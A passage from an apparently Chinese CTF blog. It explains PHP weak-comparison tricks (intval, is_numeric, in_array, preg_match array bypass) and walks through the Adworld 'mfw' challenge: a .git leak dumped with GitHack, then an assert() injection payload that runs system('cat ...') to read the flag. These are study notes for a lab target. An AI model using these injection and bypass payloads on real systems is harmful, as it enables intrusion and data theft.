class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;c=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%ed%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%a7%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%e6%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">16</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%<span class="hljs-number">33</span>%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%<span class="hljs-number">6</span>f%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></td></tr></table></figure><p>在PHP中有些函数会在内部“使用”弱相等，比如switch()、in_array()等函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//switch()函数</span><br><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;2abc&#x27;</span>;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$a</span>)&#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">//这里是弱比较</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-comment">//同上</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//结果会输出2</span><br>    <br><span class="hljs-comment">//intval()函数:将传入的参数转换为整数。如果参数是一个字符串，它会尝试将字符串中的数字部分提取出来并转换为整数。如果参数是浮点数，它会将浮点数截断为整数。如果参数是其他类型的值，它会尝试将其转换为整数。**这个漏洞已经被修复了，用未修复前的版本举个栗子**</span><br><span class="hljs-comment">//它不能用于 object，否则会产生 E_NOTICE 错误并返回 1（注意这个通常配合preg_match来使用）</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$num</span>=<span class="hljs-number">2e4</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>; <span class="hljs-comment">//20000</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>);<span class="hljs-comment">//2</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&lt;<span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>+<span class="hljs-number">1</span>)&gt;<span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//让一个变量intval后小于2020但是加一在intval会大于2021，2e4就是一个理想的值</span><br><br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;hello world!&#x27;</span>;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//输出hello world!</span><br><span class="hljs-comment">//同理还可以用0x开头的十六进制、0开头的八进制进行一些绕过</span><br><br><span class="hljs-comment">//is_numeric() 函数的作用是判断给定的值是否为数字或数字字符串。如果值是数字或可以解析为数字的字符串，则返回 true；否则返回 false。</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">123</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123.0&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">0x776179</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;0x776179&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123a&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123 &#x27;</span>));<span class="hljs-comment">//flase</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//in_array()函数：用于检查一个值是否存在于数组中。</span><br>    <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br>参数说明：<br><br>    <span class="hljs-variable">$value</span>：要检查的值。<br>    <span class="hljs-variable">$array</span>：要搜索的数组。<br>    <span class="hljs-variable">$strict</span>（可选）：指定是否进行严格的类型检查，默认为 <span class="hljs-literal">false</span>。如果设置为 <span class="hljs-literal">true</span>，则不仅要比较值，还要比较数据类型。<br><br>该函数会遍历数组中的每个元素，并与要检查的值进行比较。如果找到匹配的值，则返回 <span class="hljs-literal">true</span>，否则返回 <span class="hljs-literal">false</span>。<br>    问题出在<span class="hljs-variable">$strict</span>参数，弱不设置则为弱比较，绕过方法见上。    <br></code></pre></td></tr></table></figure><p>还在师傅们的文章上看到这么一个东西：<code>preg_match</code>与intval配合使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错</span><br><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;oh you find me！&#x27;</span>；<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?num[]=1,传个数组可以绕过die，然后Intval数组会报错返回1，从而echo flag。</span><br><br></code></pre></td></tr></table></figure><p>类似的还有array_search()函数：用于在数组中搜索指定的值，并返回该值对应的键（即数组中的索引位置）。语法如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    $value：要搜索的值。</span><br><span class="hljs-comment">    $array：要搜索的数组。</span><br><span class="hljs-comment">    $strict（可选）：指定是否进行严格的类型检查，默认为 false。如果设置为 true，则不仅要比较值，还要比较数据类型。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">该函数会遍历数组中的每个元素，并与要搜索的值进行比较。如果找到匹配的值，则返回该值对应的键；如果找不到匹配的值，则返回 false。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>​    这个函数的例题可以参考攻防世界中的easyphp。</p><p>参考了这些师傅们的文章，感谢：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_47804678/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">128814377</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_48108919/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">123279251</span><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>c53f7af34ee2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界做题记录_1</title>
    <link href="/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
    <url>/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
    
    <content type="html"><![CDATA[<p>做题记录</p><span id="more"></span><hr><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><strong>mfw</strong></h2><p>进入环境:<br><img src="/img/b5.png" alt="b5"><br>点下上面的链接看看结果About：<br><img src="/img/b6.png" alt="b6"><br>里面有个Git,想到了Git泄露,直接看下.git文件有没有：<br><img src="/img/b7.png" alt="b7"><br>上GitHack：<br><code>python GitHack.py http://61.147.171.105:55455/.git/</code><br><img src="/img/b8.png" alt="b8"><br>访问一下，看有没有啥好东西：<br>flag.php里啥也没有，可惜：<br><img src="/img/b9.png" alt="b9"><br>看下index.php,里面有不少好东西，把有用的php部分拿出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先GET方式传page，不给page赋值的话自动等于home(就是我们进去看到的首页)，然后进行一个拼接：templates&#x2F;$page.php，把这东西给$file。assert这东西叫“断言检查”，意思是如果里面的条件是真，就会接着执行后面的函数require_once，这东西有点点像include包含，至于直接包含某个文件，不用伪协议啥的我一直把它理解成执行该文件，哈哈。<br>接下来的思路就是构造page让他执行一些命令比如’ls’ ‘cat’啥的。<br>接下来的payload参考了这位师傅的文章，感谢！：<br><code>https://blog.csdn.net/m0_62063669/article/details/125427751?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169364331616800186574360%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169364331616800186574360&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125427751-null-null.142^v93^koosearch_v1&amp;utm_term=mfw&amp;spm=1018.2226.3001.4187</code><br>payloaad:<br><code>index.php/?page=flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag</code><br>解释下为什么要给page赋这么一个值，先看这个page让file成了个啥东西：<br><code>file = template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php</code><br>带到断言函数中：<br><code>assert(&quot;strpos(&#39;template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</code></p><p>strpos函数是看参数里有没有要检测的值，有的话返回第一次出现的位置，没有就返回false。明显 